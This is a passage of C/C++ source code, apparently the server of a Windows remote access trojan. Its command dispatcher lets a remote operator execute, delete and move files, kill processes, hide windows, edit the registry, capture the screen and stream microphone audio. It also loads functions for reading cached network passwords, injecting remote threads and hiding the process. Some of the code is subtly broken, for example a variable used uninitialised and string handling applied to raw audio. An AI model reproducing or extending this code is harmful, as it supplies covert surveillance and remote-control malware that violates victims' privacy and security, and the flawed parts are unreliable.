			Clients[ci].Transferring = false;
		}
	}
	else
	{
		CloseHandle(Clients[ci].hFile);
	}
}


#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

void QueryKey(HKEY hKey, unsigned short ci)
{ 
	TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
	DWORD    cbName;                   // size of name string 
	TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name 
	DWORD    cchClassName = MAX_PATH;  // size of class string 
	DWORD    cSubKeys=0;               // number of subkeys 
	DWORD    cbMaxSubKey;              // longest subkey size 
	DWORD    cchMaxClass;              // longest class string 
	DWORD    cValues;              // number of values for key 
	DWORD    cchMaxValue;          // longest value name 
	DWORD    cbMaxValueData;       // longest value data 
	DWORD    cbSecurityDescriptor; // size of security descriptor 
	FILETIME ftLastWriteTime;      // last write time 

	DWORD i, retCode; 

	TCHAR  achValue[MAX_VALUE_NAME]; 
	DWORD cchValue = MAX_VALUE_NAME; 

	char *RegData[2];
	unsigned long RegLen[2];
	unsigned int RegArray[3];

	// Get the class name and the value count. 
	retCode = RegQueryInfoKey(
		hKey,                    // key handle 
		achClass,                // buffer for class name 
		&cchClassName,           // size of class string 
		NULL,                    // reserved 
		&cSubKeys,               // number of subkeys 
		&cbMaxSubKey,            // longest subkey size 
		&cchMaxClass,            // longest class string 
		&cValues,                // number of values for this key 
		&cchMaxValue,            // longest value name 
		&cbMaxValueData,         // longest value data 
		&cbSecurityDescriptor,   // security descriptor 
		&ftLastWriteTime);       // last write time 

	// Enumerate the subkeys, until RegEnumKeyEx fails.
	char Buffer[MAX_KEY_LENGTH];
	if (cSubKeys)
	{
		//		wsprintf(Buffer, "\nNumber of subkeys: %d\n", cSubKeys);
		//        SendStr(Buffer, ci);

		for (i=0; i<cSubKeys; i++) 
		{ 
			cbName = MAX_KEY_LENGTH;
			retCode = RegEnumKeyEx(hKey, i,
				achKey, 
				&cbName, 
				NULL, 
				NULL, 
				NULL, 
				&ftLastWriteTime); 
			if (retCode == ERROR_SUCCESS) 
			{
				wsprintf(Buffer, "%s", achKey);

				char *msg = Buffer;
				unsigned long msglen = lstrlen(msg);
				SendData(44, 1, &msg, &msglen, ci);
			}
		}
	} 

	// Enumerate the key values. 

	if (cValues) 
	{
		//		wsprintf(Buffer, "\nNumber of values: %d\n", cValues);
		//		SendStr(Buffer, ci);

		for (i=0, retCode=ERROR_SUCCESS; i<cValues; i++) 
		{ 
			cchValue = MAX_VALUE_NAME; 
			achValue[0] = '\0'; 
			retCode = RegEnumValue(hKey, i, 
				achValue, 
				&cchValue, 
				NULL, 
				NULL,
				NULL,
				NULL);

			if (retCode == ERROR_SUCCESS ) 
			{ 
				wsprintf(Buffer, "%s", achValue);

				char *msg = Buffer;
				unsigned long msglen = lstrlen(msg);
				SendData(45, 1, &msg, &msglen, ci);
			} 
		}
	}
}

HKEY AppRegKey;

bool SetRegValueInt(char* RegKey, DWORD Value, bool Flush)
{
	if (RegSetValueEx(AppRegKey, RegKey, 0, REG_DWORD, (CONST BYTE*)&Value,
		sizeof(Value))!=ERROR_SUCCESS)
		return false;
	if (Flush)
		RegFlushKey(AppRegKey);
	return true;
}
//---------------------------------------------------------------------------
bool SetRegValueString(char* RegKey, char* Value, bool Flush)
{
	if (RegSetValueEx(AppRegKey, RegKey, 0, REG_SZ, (CONST BYTE*)Value,
		strlen(Value) + 1)!=ERROR_SUCCESS)
		return false;
	if (Flush)
		RegFlushKey(AppRegKey);
	return true;
}
//---------------------------------------------------------------------------
bool GetRegValue(char* RegKey, LPBYTE Buffer)
{
	DWORD BufferSize, ValueType;
	RegQueryValueEx(AppRegKey, RegKey, 0, &ValueType, NULL, &BufferSize);
	if (RegQueryValueEx(AppRegKey, RegKey, 0, &ValueType,
		Buffer, &BufferSize)==ERROR_SUCCESS)
		return true;
	return false;
}
//---------------------------------------------------------------------------
bool ExistsRegKey(char* RegKey)
{
	if (RegQueryValueEx(AppRegKey, RegKey, 0, NULL, NULL, NULL)==ERROR_SUCCESS)
		return true;
	return false;
}
//---------------------------------------------------------------------------
bool OpenRegSubKey(char * SubKey, HKEY hkey)
{
	if (RegOpenKeyEx(hkey, SubKey,
		0, KEY_WRITE | KEY_READ, &AppRegKey)==ERROR_SUCCESS)
		return true;
	return false;
}
//---------------------------------------------------------------------------
bool CloseRegSubKey(void)
{
	if (RegCloseKey(AppRegKey)==ERROR_SUCCESS)
		return true;
	return false;
}
//---------------------------------------------------------------------------
bool CreateRegSubKey(char * SubKey, HKEY hkey)
{
	SECURITY_ATTRIBUTES sa;
	DWORD dwDisposition;
	sa.nLength=sizeof sa;
	sa.lpSecurityDescriptor=NULL;
	sa.bInheritHandle=true;

	if (RegCreateKeyEx(hkey, SubKey,
		0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_READ,
		&sa, &AppRegKey, &dwDisposition)==ERROR_SUCCESS)
		return true;
	return false;
}
//---------------------------------------------------------------------------
bool EnumKey(int Index, char *Name)
{
	DWORD NameLen=250;
	FILETIME temp;
	if (RegEnumKeyEx(AppRegKey, Index, Name, &NameLen, NULL, NULL, NULL, &temp)==
		ERROR_SUCCESS)
		return true;
	return false;
}
//---------------------------------------------------------------------------
HKEY GetHKEY(void)
{
	return AppRegKey;
}
//---------------------------------------------------------------------------
void SetHKEY(HKEY hKey)
{
	AppRegKey=hKey;
}
//---------------------------------------------------------------------------

char *WindowsString(OSVERSIONINFO *osvi)
{
	if (osvi->dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) 
	{
		if (osvi->dwMajorVersion >= 5 || osvi->dwMinorVersion >= 50)
		{
			return "Windows ME";
		}
		else if (osvi->dwMajorVersion == 4 && osvi->dwMinorVersion >= 10)
		{
			return "Windows 98";
		} 
		else if (osvi->dwMajorVersion == 4 && osvi->dwMinorVersion == 0)
		{
			return "Windows 95";
		}
		else
		{
			return "Unknown";
		}

	} 
	else if (osvi->dwPlatformId == VER_PLATFORM_WIN32_NT) 
	{
		if (osvi->dwMajorVersion == 6 && osvi->dwMinorVersion >= 1)
		{
			return "Windows 7";
		}
		else if (osvi->dwMajorVersion == 6 && osvi->dwMinorVersion == 0)
		{
			return "Windows Vista";
		}
		else if (osvi->dwMajorVersion == 5 && osvi->dwMinorVersion >= 1)
		{
			return "Windows XP";
		}
		else if (osvi->dwMajorVersion == 5 && osvi->dwMinorVersion == 0)
		{
			return "Windows 2000";
		}
		else if (osvi->dwMajorVersion == 4)
		{
			return "Windows NT4";
		}
		else
		{
			return "Unknown";
		}

	}
	else
	{
		return "Unknown";
	}
}

int MiscTimerRead(float *lpTime)
{
	_int64 PerformanceTimerValue;
	DWORD RegularTimerValue;

	if (bPerformanceTimerEnabled)
	{
		if (!QueryPerformanceCounter((LARGE_INTEGER *)&PerformanceTimerValue))
			return -1;
		*lpTime = (float)(PerformanceTimerValue - PerformanceTimerProgramStart) * TimerSecsPerTick;
	}
	else
	{
		RegularTimerValue = timeGetTime();
		*lpTime = (RegularTimerValue - RegularTimerProgramStart) * TimerSecsPerTick;
	}

	return 0;
}

ENUMPASSWORD pWNetEnumCachedPasswords;
WNETCLOSEENUM pWNetCloseEnum;
WNETENUMRESOURCE pWNetEnumResource;
WNETOPENENUM pWNetOpenEnum;
WNETCANCELCONNECTION2 pWNetCancelConnection2;
WNETADDCONNECTION2 pWNetAddConnection2;

PREGISTERSERVICEPROCESS pRegisterServiceProcess;
PCREATETOOLHELP32SNAPSHOT pCreateToolhelp32Snapshot;
PPROCESS32FIRST pProcess32First;
PPROCESS32NEXT pProcess32Next;
PMODULE32FIRST pModule32First;
PMODULE32NEXT pModule32Next;
PTHREAD32FIRST pThread32First;
PTHREAD32NEXT pThread32Next;
PCREATEREMOTETHREAD pCreateRemoteThread;
PVIRTUALFREEEX pVirtualFreeEx;
PVIRTUALALLOCEX pVirtualAllocEx;

void LoadDynamic(void)
{
	HINSTANCE dll;

	// Load kernel32 functions
	dll = GetModuleHandle("kernel32.dll");
	if (dll != NULL) {
		pRegisterServiceProcess = (PREGISTERSERVICEPROCESS)GetProcAddress(dll, "RegisterServiceProcess");
		pCreateToolhelp32Snapshot = (PCREATETOOLHELP32SNAPSHOT)GetProcAddress(dll, "CreateToolhelp32Snapshot");
		pProcess32First = (PPROCESS32FIRST)GetProcAddress(dll, "Process32First");
		pProcess32Next = (PPROCESS32NEXT)GetProcAddress(dll, "Process32Next");
		pModule32First = (PMODULE32FIRST)GetProcAddress(dll, "Module32First");
		pModule32Next = (PMODULE32NEXT)GetProcAddress(dll, "Module32Next");
		pThread32First = (PTHREAD32FIRST)GetProcAddress(dll, "Thread32First");
		pThread32Next = (PTHREAD32NEXT)GetProcAddress(dll, "Thread32Next");
		pCreateRemoteThread = (PCREATEREMOTETHREAD)GetProcAddress(dll, "CreateRemoteThread");
		pVirtualFreeEx = (PVIRTUALFREEEX)GetProcAddress(dll, "VirtualFreeEx");
		pVirtualAllocEx = (PVIRTUALALLOCEX)GetProcAddress(dll, "VirtualAllocEx");
	}

	dll = LoadLibrary("MPR.DLL");
	if(dll != NULL) {
		pWNetEnumCachedPasswords = (ENUMPASSWORD)GetProcAddress(dll, "WNetEnumCachedPasswords");
		pWNetCloseEnum = (WNETCLOSEENUM)GetProcAddress(dll, "WNetCloseEnum");
		pWNetEnumResource = (WNETENUMRESOURCE)GetProcAddress(dll, "WNetEnumResourceA");
		pWNetOpenEnum = (WNETOPENENUM)GetProcAddress(dll, "WNetOpenEnumA");
		pWNetCancelConnection2 = (WNETCANCELCONNECTION2)GetProcAddress(dll, "WNetCancelConnection2A");
		pWNetAddConnection2 = (WNETADDCONNECTION2)GetProcAddress(dll, "WNetAddConnection2A");
	}
}

// Window list callback function

BOOL CALLBACK WinListProc(HWND hWnd, LPARAM lParam)
{
	char *WindowData[2];
	unsigned long WindowLen[2];
	unsigned int WindowArray[2];
	char WindowText[100];

	GetWindowText(hWnd, WindowText, sizeof(WindowText));

	WindowArray[0] = (DWORD)hWnd;

	if (hWnd == GetForegroundWindow())
		WindowArray[1] = 2;
	else if (IsWindowVisible(hWnd))
		WindowArray[1] = 1;
	else
		WindowArray[1] = 0;

	WindowData[0] = WindowText;
	WindowData[1] = (char *)WindowArray;
	WindowLen[0] = lstrlen(WindowText);
	WindowLen[1] = 8;

	SendData(26, 2, WindowData, WindowLen, lParam);
	return true;
}

// Application list callback function

BOOL CALLBACK AppListProc(HWND hWnd, LPARAM lParam)
{
	char *AppData[2];
	unsigned long AppLen[2];
	unsigned int AppArray[2];
	char WindowText[100];
	long WindowStyle;

	WindowStyle = GetWindowLong(hWnd, GWL_STYLE);
	if (((WindowStyle & WS_POPUP) != WS_POPUP) || (((WindowStyle & WS_GROUP) == WS_GROUP) && ((WindowStyle & WS_DISABLED) != WS_DISABLED) && ((WindowStyle & WS_SYSMENU) == WS_SYSMENU))) {
		if (GetWindow(hWnd, GW_OWNER) == 0) {
			GetWindowText(hWnd, WindowText, sizeof(WindowText));
			if (lstrcmp(WindowText, "") != 0) {
				AppArray[0] = (DWORD)hWnd;
				if (GetWindow(GetForegroundWindow(), GW_OWNER) == hWnd)
					AppArray[1] = 2;
				else if (IsWindowVisible(hWnd))
					AppArray[1] = 1;
				else
					AppArray[1] = 0;
				AppData[0] = WindowText;
				AppData[1] = (char *)AppArray;
				AppLen[0] = lstrlen(WindowText);
				AppLen[1] = 8;
				SendData(30, 2, AppData, AppLen, lParam);
			}
		}
	}

	return true;
}

// Network share enumeration function

void NetEnumerate(LPNETRESOURCE NetNode, LPARAM lParam)
{
	HANDLE hEnum;
	LPNETRESOURCE Buf, lpnr;
	unsigned long Result, Count, BufSize;
	char *NetData[2];
	unsigned long NetLen[2];
	unsigned int NetArray[2];

	// Begin enumeration
	if (pWNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, NetNode, &hEnum) == NO_ERROR) {

		// Allocate resources
		BufSize = 16384;
		Buf = (LPNETRESOURCE)GlobalAlloc(GPTR, BufSize);

		while (true) {
			Count = 0xFFFFFFFF;

			// Continue enumeration
			Result = pWNetEnumResource(hEnum, &Count, Buf, &BufSize);

			if (Result == ERROR_MORE_DATA) {
				GlobalFree((HGLOBAL)Buf);
				Buf = (LPNETRESOURCE)GlobalAlloc(GPTR, BufSize);
				Count = 0xFFFFFFFF;
				Result = pWNetEnumResource(hEnum, &Count, Buf, &BufSize);
			}

			if (Result == ERROR_NO_MORE_ITEMS) 
				break;

			if (Result != NO_ERROR)
				break;

			lpnr = Buf;
			while (Count > 0) {
				NetData[0] = lpnr->lpRemoteName;
				NetData[1] = (char *)NetArray;
				NetArray[0] = lpnr->dwDisplayType;
				NetArray[1] = lpnr->dwType;
				NetLen[0] = lstrlen(lpnr->lpRemoteName);
				NetLen[1] = 8;
				SendData(35, 2, NetData, NetLen, lParam);

				NetEnumerate(lpnr, lParam);

				lpnr++;
				Count--;
			}

		}

		// Free resources
		GlobalFree((HGLOBAL)Buf);

		// End enumeration
		pWNetCloseEnum(hEnum);
	}
}


void SendString(char *cmd, char *msg, unsigned short ci)
{
	unsigned long msglen = lstrlen(msg);
	SendData(atoi(cmd), 1, &msg, &msglen, ci);
}

#define STATE_NONE          0
#define STATE_PLAYING       1
#define STATE_STOPPED       2

WAVEFORMATEX    g_wave_format;

HWAVEIN         g_wave_in;
WAVEHDR         g_header_in[4];
char            g_buffer_in[4*4096];
int             g_state_in = STATE_NONE;
int             g_quality = 0;
int				g_ci = 0;

void CALLBACK wave_in_proc(HWAVEIN wave_in, UINT msg, DWORD_PTR dwInstance, DWORD_PTR dwParam1, DWORD_PTR dwParam2)
{
	int error;
	DWORD dw;
	char *Text;

	switch (msg)
	{
	case WIM_DATA:
		WAVEHDR* hdr = (WAVEHDR*) dwParam1;
		waveInUnprepareHeader(g_wave_in, hdr, sizeof(WAVEHDR));

		Text = (char *)hdr->lpData;
		dw = lstrlen(Text);
		SendData(302, 1, &Text, &dw, g_ci);

		if (g_state_in == STATE_PLAYING)
		{
			hdr->dwFlags = 0;
			waveInPrepareHeader(g_wave_in, hdr, sizeof(WAVEHDR)); 
			waveInAddBuffer(g_wave_in, hdr, sizeof(WAVEHDR));

			Text = (char *)hdr->lpData;
			dw = lstrlen(Text);
			SendData(303, 1, &Text, &dw, g_ci);
		}

		break;
	}
}


void ParseData(unsigned short cmd, unsigned long datac, char **data, unsigned long *datal, unsigned short ci)
{
	int i, j;
	unsigned long argl[10];
	char *argv[10], *temp;
	HANDLE h;
	DWORD dw;
	char *Text;

	if (datac > 0) {
		for (i=0; i<datac; i++)
		{
			//			SetRichText(CON_RED, "cmd[%i] data[%i]: %s\r\n", cmd, i, data[i]);
		}
	}

	switch (cmd) {
	case 0:
		// Loopback cmd (used for ping)
		SendData(cmd, datac, data, datal, ci);
		break;
	case 4:
		// SendStr cmd (used for debug)
		MessageBox(0, data[0], "Server Debug", 0);
		break;
	case 7:
		// Directory download
		if (datac > 0) {
			WIN32_FIND_DATA FindData;
			char *DirData[2];
			unsigned long DirLen[2];
			unsigned long DirArray[3];

			DirData[0] = FindData.cFileName;
			DirData[1] = (char *)DirArray;
			DirLen[1] = 12;

			if (data[0][datal[0] - 1] != '\\') {
				data[0] = (char *)realloc(data[0], datal[0] + 2);
				data[0] = lstrcat(data[0], "\\");
				datal[0]++;
			}

			data[0] = (char *)realloc(data[0], datal[0] + 4);
			h = FindFirstFile(lstrcat(data[0], "*.*"), &FindData);
			if (h != INVALID_HANDLE_VALUE) {
				SendData(8, datac, data, datal, ci);
				do {
					if ((lstrcmp(FindData.cFileName, ".") != 0) /*&& (lstrcmp(FindData.cFileName, "..") != 0)*/) {
						DirArray[0] = FindData.nFileSizeHigh;
						DirArray[1] = FindData.nFileSizeLow;
						DirArray[2] = FindData.dwFileAttributes;
						DirLen[0] = lstrlen(FindData.cFileName);
						SendData(7, 2, DirData, DirLen, ci);
					}
				} while (FindNextFile(h, &FindData));
				SendData(9, 0, NULL, NULL, ci);
				FindClose(h);
			} else
				SendData(10, datac, data, datal, ci);
		}
		break;
		//case 8: begin dir
		//case 9: end dir
		//case 10: invalid path
	case 11:
		// Drive list
		char *DriveData[4];
		unsigned long DriveLen[4];
		int DriveArray[5];
		char Drive[4];
		char VolInfo[255], SysInfo[255];
		ULARGE_INTEGER FreeSpace, TotalSize;
		int ErrorMode, DriveType;

		lstrcpy(Drive, " :\\");
		DriveData[0] = Drive;
		DriveData[1] = VolInfo;
		DriveData[2] = SysInfo;
		DriveData[3] = (char *)DriveArray;
		DriveLen[0] = 3;
		DriveLen[3] = 20;

		ErrorMode = SetErrorMode(SEM_FAILCRITICALERRORS);
		SendData(11, datac, data, datal, ci);
		i = GetLogicalDrives();
		for (j = 0; j <= 25; j++)
			if ((i & (1 << j)) != 0)
			{
				Drive[0] = char(j) + 'A';
				memset(&FreeSpace, 0, sizeof(ULARGE_INTEGER));
				memset(&TotalSize, 0, sizeof(ULARGE_INTEGER));
				memset(VolInfo, 0, 255);
				memset(SysInfo, 0, 255);
				DriveType = GetDriveType(Drive);
				GetDiskFreeSpaceEx(Drive, &FreeSpace, &TotalSize, NULL);
				GetVolumeInformation(Drive, VolInfo, 255, NULL, NULL, NULL, SysInfo, 255);
				DriveArray[0] = DriveType;
				DriveArray[1] = FreeSpace.HighPart;
				DriveArray[2] = FreeSpace.LowPart;
				DriveArray[3] = TotalSize.HighPart;
				DriveArray[4] = TotalSize.LowPart;
				DriveLen[1] = lstrlen(VolInfo);
				DriveLen[2] = lstrlen(SysInfo);
				SendData(11, 4, DriveData, DriveLen, ci);
			}
			SetErrorMode(ErrorMode);
			break;

	case 12:
		// Delete file
		if (datac > 0) {
			char DeleteMsg[255];

			if (DeleteFile(data[0]))
				wsprintf(DeleteMsg, "File \"%s\" successfully deleted.", data[0]); 
			else
				wsprintf(DeleteMsg, "Error deleting file \"%s\".", data[0]);

			SendStr(DeleteMsg, ci);
		}
		break;
	case 13:
		// Copy file
		if (datac > 1) {
			char CopyMsg[255];

			if (CopyFile(data[0], data[1], true))
				wsprintf(CopyMsg, "File \"%s\" successfully copied to \"%s\".", data[0], data[1]);
			else
				wsprintf(CopyMsg, "Error copying file \"%s\" to \"%s\".", data[0], data[1]);

			SendStr(CopyMsg, ci);
		}
		break;
	case 14:
		// Move file
		if (datac > 1) {
			char MoveMsg[255];

			if (MoveFile(data[0], data[1]))
				wsprintf(MoveMsg, "File \"%s\" successfully moved to \"%s\".", data[0], data[1]);
			else
				wsprintf(MoveMsg, "Error moving file \"%s\" to \"%s\".", data[0], data[1]);

			SendStr(MoveMsg, ci);
		}
		break;
	case 15:
		// Execute file
		if (datac > 0) {
			char ExecuteMsg[255];

			if ((int)ShellExecute(0, "open", data[0], NULL, NULL, SW_SHOW) > 32)
				wsprintf(ExecuteMsg, "File \"%s\" successfully executed.", data[0]);
			else
				wsprintf(ExecuteMsg, "Error executing file \"%s\".", data[0]);

			SendStr(ExecuteMsg, ci);
		}
		break;
	case 16:
		// Create directory
		if (datac > 0) {
			char CDMsg[255];

			if (CreateDirectory(data[0], NULL))
				wsprintf(CDMsg, "Directory \"%s\" successfully created.", data[0]);
			else
				wsprintf(CDMsg, "Error creating directory \"%s\".", data[0]);

			SendStr(CDMsg, ci);
		}
		break;
	case 17:
		// Remove directory
		if (datac > 0) {
			char RDMsg[255];

			if (RemoveDirectory(data[0]))
				wsprintf(RDMsg, "Directory \"%s\" successfully removed.", data[0]);
			else
				wsprintf(RDMsg, "Error removing directory \"%s\".", data[0]);

			SendStr(RDMsg, ci);
		}
		break;

	case 22:
		// Process list
		PROCESSENTRY32 pe32;
		char *ProcData[2];
		unsigned long ProcLen[2];
		unsigned int ProcArray[3];

		ProcData[0] = pe32.szExeFile;
		ProcData[1] = (char *)ProcArray;
		ProcLen[1] = 12;

		h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (h != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(pe32);
			if (Process32First(h, &pe32)) {
				SendData(23, 0, NULL, NULL, ci);
				do {
					ProcArray[0] = pe32.th32ProcessID;
					ProcArray[1] = pe32.cntThreads;
					ProcArray[2] = pe32.pcPriClassBase;
					ProcLen[0] = lstrlen(ProcData[0]);
					SendData(22, 2, ProcData, ProcLen, ci);
				} while (Process32Next(h, &pe32));
				SendData(24, 0, NULL, NULL, ci);
			}
			CloseHandle(h);
		}
		break;
		//case 23: bpl
		//case 24: epl
	case 25:
		// Terminate process
		if (datac > 0) {
			char TerminateMsg[64];

			h = OpenProcess(PROCESS_TERMINATE, false, (DWORD)atoi(data[0]));
			if (h != INVALID_HANDLE_VALUE) {
				if (TerminateProcess(h, 0)) {
					wsprintf(TerminateMsg, "Process %lu successfully terminated.", (DWORD)atoi(data[0]));
				} else {
					wsprintf(TerminateMsg, "Error terminating process %lu.", (DWORD)atoi(data[0]));
				}
				CloseHandle(h);
			} else
				wsprintf(TerminateMsg, "Error accessing process %lu.", (DWORD)atoi(data[0]));

			SendStr(TerminateMsg, ci);
		}
		break;
	case 26:
		// Window list
		SendData(27, 0, NULL, NULL, ci);
		EnumWindows(WinListProc, (LPARAM)ci);
		//fixme: enumwindows fail
		SendData(28, 0, NULL, NULL, ci);
		break;
		//case27:bwl
		//case28:ewl
	case 29:
		// Window message
		if (datac > 0) {
			switch (atoi(data[0])) {
			case 0: // Close window
				PostMessage((HWND)atoi(data[1]), WM_CLOSE, 0, 0);
				break;
			case 1: // Set window caption
				if (datac > 1)
					SetWindowText((HWND)atoi(data[1]), data[2]);
				else
					return;
				break;
			case 2: // Bring window to front
				SetForegroundWindow((HWND)atoi(data[1]));
				break;
			case 3: // Show window
				ShowWindow((HWND)atoi(data[1]), SW_SHOW);
				break;
			case 4: // Hide window
				ShowWindow((HWND)atoi(data[1]), SW_HIDE);
				break;
			case 5: // Enable window
				EnableWindow((HWND)atoi(data[1]), true);
				break;
			case 6: // Disable window
				EnableWindow((HWND)atoi(data[1]), false);
				break;
			case 7: // Minimize window
				ShowWindow((HWND)atoi(data[1]), SW_MINIMIZE);
				break;
			case 8: // Maximize window
				ShowWindow((HWND)atoi(data[1]), SW_MAXIMIZE);
				break;
			case 9: // Restore window
				ShowWindow((HWND)atoi(data[1]), SW_RESTORE);
				break;
			}

			SendStr("Message sent to window.", ci);
		}
		break;
	case 30:
		// Application list
		SendData(31, 0, NULL, NULL, ci);
		EnumWindows(AppListProc, (LPARAM)ci);
		//fixme: enumwindows fail
		SendData(32, 0, NULL, NULL, ci);
		break;
		//case 31: bal
		//case 32: eal
	case 33:
		// Window information
		if (datac > 0) {
			char *WinInfoData[4];
			unsigned long WinInfoLen[4];
			unsigned int WinInfoArray[4];
			char WindowText[99], ParentText[99], WindowClass[99];
			//HICON icon;

			GetWindowThreadProcessId((HWND)atoi(data[0]), &dw);

			GetWindowText((HWND)atoi(data[0]), WindowText, sizeof(WindowText));
			GetClassName((HWND)atoi(data[0]), WindowClass, sizeof(WindowClass));

			WinInfoArray[0] = atoi(data[0]);
			WinInfoArray[1] = GetWindowLong((HWND)atoi(data[0]), GWL_HWNDPARENT);
			WinInfoArray[2] = GetWindowLong((HWND)atoi(data[0]), GWL_STYLE);
			WinInfoArray[3] = GetWindowLong((HWND)atoi(data[0]), GWL_EXSTYLE);

			GetWindowText((HWND)WinInfoArray[1], ParentText, sizeof(ParentText));

			WinInfoData[0] = WindowText;
			WinInfoData[1] = WindowClass;
			WinInfoData[2] = ParentText;
			WinInfoData[3] = (char *)WinInfoArray;

			WinInfoLen[0] = lstrlen(WindowText);
			WinInfoLen[1] = lstrlen(WindowClass);
			WinInfoLen[2] = lstrlen(ParentText);
			WinInfoLen[3] = 16;

			SendData(33, 4, WinInfoData, WinInfoLen, ci);
		}
		break;
	case 34:
		// Process information
		break;
	case 35:
		// Network share list
		SendData(36, 0, NULL, NULL, ci);
		NetEnumerate(NULL, (LPARAM)ci);
		SendData(37, 0, NULL, NULL, ci);
		break;
		//case36: bnsl
		//case37: ensl
		// Filestransfer stuff
		//case 40:
		//	// Connected clients list
		//	char *ClientData[3];
		//	unsigned long ClientLen[3];

		//	SendData(41, 0, NULL, NULL, ci);
		//	for (i = 0; i < ClientCount; i++)
		//		if (Clients[i] != NULL)
		//			if (Clients[i]->Access && !Clients[i]->Transfer) {
		//				dw = GetTickCount() - Clients[i]->ConnectTime;
		//				ClientData[0] = Clients[i]->Username;
		//				ClientData[1] = inet_ntoa(Clients[i]->sin.sin_addr);
		//				ClientData[2] = (char *)&dw;
		//				ClientLen[0] = lstrlen(Clients[i]->Username);
		//				ClientLen[1] = lstrlen(ClientData[1]);
		//				ClientLen[2] = 4;
		//				SendData(40, 3, ClientData, ClientLen);
		//			}
		//	SendData(42, 0, NULL, NULL);
		//	break;
		////case41
		////case42

	case 43:
		SendData(43, 0, NULL, NULL, ci);

		SetHKEY(HKEY_CURRENT_USER);

		if (_stricmp(data[0], "HKEY_CLASSES_ROOT") == 0) {
			SetHKEY(HKEY_CLASSES_ROOT);
		} else if (_stricmp(data[0], "HKEY_CURRENT_USER") == 0) {
			SetHKEY(HKEY_CURRENT_USER);
		} else if (_stricmp(data[0], "HKEY_LOCAL_MACHINE") == 0) {
			SetHKEY(HKEY_LOCAL_MACHINE);
		} else if (_stricmp(data[0], "HKEY_USERS") == 0) {
			SetHKEY(HKEY_USERS);
		} else if (_stricmp(data[0], "HKEY_CURRENT_CONFIG") == 0) {
			SetHKEY(HKEY_CURRENT_CONFIG);
		}

		// Registry list
		HKEY hTestKey;

		if (data[0][datal[0] - 1] != '\\') {
			data[0] = (char *)realloc(data[0], datal[0] + 2);
			data[0] = lstrcat(data[0], "\\");
			datal[0]++;
		}

		data[0] = (char *)realloc(data[0], datal[0] + 4);

		if( RegOpenKeyEx( AppRegKey,
			data[0],
			0,
			KEY_READ,
			&hTestKey) == ERROR_SUCCESS
			)
		{
			QueryKey(hTestKey, ci);
		}
		else
		{
			FILETIME filetime;
			TCHAR name[16383];
			DWORD size;
			int ix = 0;
			while( RegEnumKeyEx(AppRegKey , ix , name , &size , 0 , 0 , 0 , &filetime) != ERROR_NO_MORE_ITEMS)
			{
				char *msg = name;
				unsigned long msglen = lstrlen(msg);
				SendData(44, 1, &msg, &msglen, ci);
				ix++;
				size = sizeof(name);
			}
		}

		RegCloseKey(hTestKey);
		break;

	case 45:
		SendData(43, 0, NULL, NULL, ci);

		// Registry list
		HKEY g_hTestKey;

		if (data[0][datal[0] - 1] != '\\') {
			data[0] = (char *)realloc(data[0], datal[0] + 2);
			data[0] = lstrcat(data[0], "\\");
			datal[0]++;
		}

		data[0] = (char *)realloc(data[0], datal[0] + 4);

		if( RegOpenKeyEx( AppRegKey,
			data[0],
			0,
			KEY_READ,
			&g_hTestKey) == ERROR_SUCCESS
			)
		{
			QueryKey(g_hTestKey, ci);
		}
		else
		{
			FILETIME filetime;
			TCHAR name[16383];
			DWORD size;
			int ix = 0;
			while( RegEnumKeyEx(AppRegKey , ix , name , &size , 0 , 0 , 0 , &filetime) != ERROR_NO_MORE_ITEMS)
			{
				char *msg = name;
				unsigned long msglen = lstrlen(msg);
				SendData(44, 1, &msg, &msglen, ci);
				ix++;
				size = sizeof(name);
			}
		}

		RegCloseKey(g_hTestKey);
		break;

	case 46:
		//Registry Set Value
		if (datac > 0) {
			OpenRegSubKey(data[1], AppRegKey);
			SetRegValueString(data[0], data[2], true);
			CloseRegSubKey();
			SendStr("Registry value set.", ci);
		}
		break;
	case 47:
		//Registry Create Subkey
		if (datac > 0) {
			CreateRegSubKey(data[1], AppRegKey);
			CloseRegSubKey();
			SendStr("Registry subkey created.", ci);
		}
		break;

	case 100:
		HDC hdc;
		PAINTSTRUCT ps;
		RECT r;
		//GetClientRect(g_hWnd, &r);
		BOOL bResult;

		unsigned int RectArray[4];
		memcpy(RectArray, data[1], datal[1]);

		r.top = RectArray[0];
		r.bottom = RectArray[1];
		r.left = RectArray[2];
		r.right = RectArray[3];

		// and to make it topmost
//		SetWindowPos (ghWnd, 0, r.left, r.top, r.right - r.left, r.bottom - r.top, 0);
		MoveWindow(ghWnd, r.left, r.top, r.right - r.left, r.bottom - r.top, TRUE);

		CaptureAnImage(ghWnd, r);

		Clients[ci].hFile = CreateFile("captureqwsx.bmp", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL, NULL);

		if (Clients[ci].hFile != INVALID_HANDLE_VALUE)
		{
			ghFile = Clients[ci].hFile;
			unsigned long size = GetFileSize(Clients[ci].hFile, NULL);
			char buf[256];
			wsprintf(buf, "%d", GetFileSize(Clients[ci].hFile, NULL));

			argv[0] = temp = "captureqwsx.bmp";
			argl[0] = (int)strlen(temp) + 1;
			argv[1] = buf;
			argl[1] = (int)strlen(buf) + 1;

			SendData(129, 2, argv, argl, ci);
			Clients[ci].Transferring = true;
			WSAAsyncSelect(Clients[ci].hSocket, ghWnd, WM_MAINSOCKET, 0);
			ioctlsocket(Clients[ci].hSocket, FIONBIO, 0);
			Sleep(100);
			StartSendThread(Clients[ci].hSocket, ci);
		}
		break;

	case 111:
		// Parameter validation
		const char *strInterface;
		uint16_t nPort;
		nPort = 8080;
		uint16_t nMaxConnections;
		nMaxConnections = 10;
		if (datac > 0) {
			// Initialize the capturer helper
			WinScreenCaptureHelper helper;

			// Start server
			WinSocket server;
			server.startServer(strInterface, nPort, onHttpConnection, &helper, nMaxConnections);
			SendStr("Successfully started Server on 8080", ci);
		}
		break;

	case 128:
		Clients[ci].hFile = CreateFile(data[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL, NULL);

		if (Clients[ci].hFile != INVALID_HANDLE_VALUE)
		{
